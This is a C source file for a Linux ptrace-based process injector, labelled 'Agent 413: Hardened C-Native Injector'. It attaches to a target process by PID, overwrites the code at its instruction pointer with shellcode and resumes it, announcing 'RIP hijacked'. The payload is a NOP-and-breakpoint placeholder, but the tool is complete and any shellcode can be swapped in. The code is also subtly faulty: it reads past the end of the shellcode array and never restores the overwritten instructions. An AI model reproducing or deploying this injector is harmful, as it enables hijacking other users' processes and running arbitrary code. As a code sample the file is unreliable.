#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/uio.h>

/* Agent 413: Hardened C-Native Injector.
   Targeting x86_64 Linux. This code attaches to a process,
   injects a shellcode 'Nop-Sled + Interrupt', and resumes.
*/

// Example Shellcode: \xcc is INT3 (Breakpoint/Trap) - proves we hit the code
unsigned char shellcode[] = "\x90\x90\x90\xcc"; 

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    struct user_regs_struct regs;

    // 1. Attach to the target
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("ptrace attach");
        return 1;
    }
    waitpid(target_pid, NULL, 0);
    printf("[*] Attached to PID %d\n", target_pid);

    // 2. Capture CPU Registers
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
    printf("[*] Original RIP: %p\n", (void*)regs.rip);

    // 3. Inject Shellcode at the current Instruction Pointer (RIP)
    // In a 'Pro' version, we would use mmap to find a safe location.
    for (int i = 0; i < sizeof(shellcode); i += 8) {
        long data;
        memcpy(&data, shellcode + i, 8);
        if (ptrace(PTRACE_POKETEXT, target_pid, (void*)(regs.rip + i), (void*)data) < 0) {
            perror("ptrace poketext");
            return 1;
        }
    }

    // 4. Detach and Resume
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    printf("[!!!] Injection Complete. RIP hijacked.\n");

    return 0;
}
